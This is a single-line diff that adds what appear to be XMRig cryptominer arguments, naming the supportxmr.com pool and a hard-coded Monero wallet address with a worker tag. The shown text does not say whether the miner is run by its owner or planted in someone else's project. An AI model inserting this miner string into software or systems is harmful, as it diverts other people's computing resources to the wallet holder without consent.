@@ -1,0 +1,1 @@
+--donate-level 5 -o pool.supportxmr.com:443 -u 46GVPfjkYTZUSzz2D5swMSgic2DTLTBUe93kFJkV2CCDhzxd1vQw3FB37UinL9jM7f2SioymjyWkjYTBiMn4sJYHGJYXcF8 -k --tls -p RyzenCPU
